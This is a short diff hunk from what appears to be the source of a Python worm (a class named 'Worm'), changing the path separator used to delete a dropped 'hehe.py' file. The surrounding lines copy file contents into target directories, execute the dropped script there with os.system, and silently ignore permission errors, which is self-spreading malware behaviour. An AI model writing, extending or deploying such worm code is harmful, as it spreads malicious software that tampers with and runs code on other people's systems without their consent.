@@ -59,7 +59,7 @@ class Worm:
                     with open(to_infect_o, "r") as fe:
                         f.write(fe.read())
                 os.system("cd " + target + " && python.exe hehe.py && cd " + THIS_DIR)
-                os.remove(target + "/hehe.py")
+                os.remove(target + "\\hehe.py")
             except PermissionError:
                 pass
 
